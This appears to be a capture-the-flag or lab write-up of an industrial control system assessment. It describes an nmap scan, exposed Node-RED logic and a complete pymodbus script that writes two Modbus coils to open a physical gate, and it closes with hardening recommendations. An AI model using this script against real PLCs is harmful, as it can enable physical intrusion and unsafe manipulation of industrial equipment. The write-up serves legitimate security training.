# ICS Security Assessment - Gate Bypass Writeup

## Executive Summary

The system was compromised by first conducting a full reconnaissance scan to identify an insecure Node-RED control panel. Analysis of the publicly exposed control logic revealed that the gate's state was dependent on two specific Modbus coils. Using a custom Python script, these coils were successfully manipulated, bypassing the security and opening the gate.

---

## Phase 1: Comprehensive Reconnaissance

The operation began with an exhaustive scan of all TCP ports to build a complete map of the target's attack surface. This step was critical to discovering the ICS infrastructure.

### 1.1 Port Scan Command

```bash
nmap -p- -sV 10.10.223.93
```

### 1.2 Discovered Services

The scan identified the key services required for the attack:

| Port | Service | Details |
|------|---------|---------|
| 80/tcp | HTTP | "Gate Monitor" - A web-based status display |
| 102/tcp | Siemens S7 (iso-tsap) | Direct PLC communication port |
| 502/tcp | Modbus TCP | Standard ICS protocol used for gate control |
| 1880/tcp | HTTP (Node-RED) | Web-based ICS logic editor, the primary entry point |

---

## Phase 2: Analyzing the Control Logic

After discovering the Node-RED editor on port 1880, an analysis of its exposed control logic revealed the exact requirements to operate the gate.

### 2.1 Logical Flaw Discovery

By analyzing the JavaScript code within the function nodes, we discovered the precise logic for the gate controls:

- The **"Motion Detector"** system was controlled by the state of **Modbus Coil 20**
- The **"Badge"** system was controlled by the state of **Modbus Coil 25**

### 2.2 The Vulnerability

The key vulnerability was a combination of factors:

1. **Insecure Read Access**: The Node-RED editor allowed anonymous read access, exposing the entire control logic
2. **Lax PLC Permissions**: The PLC coils were discovered to be writable via the pymodbus library
3. **Counter-intuitive Logic**: The final logic required setting both coils to `FALSE`, not `TRUE`

---

## Phase 3: Exploitation via Python Script

The final step was to use a purpose-built Python script to set both required coils (20 and 25) to `FALSE`. This action satisfied the gate's hidden logic.

### 3.1 Final Exploit Script

This script verifies the initial state, attempts to write `FALSE` to both coils, and re-verifies the final state.

**Command:**
```bash
python3 toggle_coils_v2.py
```

**Script Content:**
```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

# --- Configuration ---
PLC_IP = '10.10.223.93'
TCP_PORT = 502
SLAVE_ID = 1

MOTION_COIL = 20
BADGE_COIL = 25
VALUE_TO_WRITE = False # The final, correct value

# --- Main Execution ---
client = ModbusTcpClient(PLC_IP, port=TCP_PORT)
try:
    print(f"[+] Connecting to {PLC_IP}...")
    client.connect()

    # 1. Read the initial state
    print("\n[+] Checking initial coil states...")
    initial_motion_state = client.read_coils(MOTION_COIL, count=1, slave=SLAVE_ID).bits[0]
    initial_badge_state = client.read_coils(BADGE_COIL, count=1, slave=SLAVE_ID).bits[0]
    print(f"    -> Initial State: Coil {MOTION_COIL} = {initial_motion_state}, Coil {BADGE_COIL} = {initial_badge_state}")

    # 2. Attempt to write the new state
    print(f"\n[+] Attempting to write '{VALUE_TO_WRITE}' to both coils...")
    client.write_coil(MOTION_COIL, VALUE_TO_WRITE, slave=SLAVE_ID)
    client.write_coil(BADGE_COIL, VALUE_TO_WRITE, slave=SLAVE_ID)
    print("    -> Write commands sent.")

    # 3. Re-check the coils to verify
    print("\n[+] Re-checking coil states after write attempt...")
    final_motion_state = client.read_coils(MOTION_COIL, count=1, slave=SLAVE_ID).bits[0]
    final_badge_state = client.read_coils(BADGE_COIL, count=1, slave=SLAVE_ID).bits[0]
    print(f"    -> Final State:   Coil {MOTION_COIL} = {final_motion_state}, Coil {BADGE_COIL} = {final_badge_state}")

except Exception as e:
    print(f"\n[!] An error occurred: {e}")
finally:
    client.close()
    print("\n[+] Disconnected.")
```

### 3.2 Mission Success

After running the final script, a check of the "Gate Monitor" on port 80 confirmed the gate was open and the objective was complete.

---

## Summary

This assessment demonstrated critical vulnerabilities in the ICS infrastructure:
- **Exposed control logic** through unsecured Node-RED interface
- **Writable PLC coils** without proper access controls
- **Insufficient network segmentation** allowing direct access to industrial protocols

**Recommendations:**
- Implement proper authentication for Node-RED editor
- Restrict write access to critical PLC coils
- Segment ICS networks from general network access
- Monitor and log all Modbus communications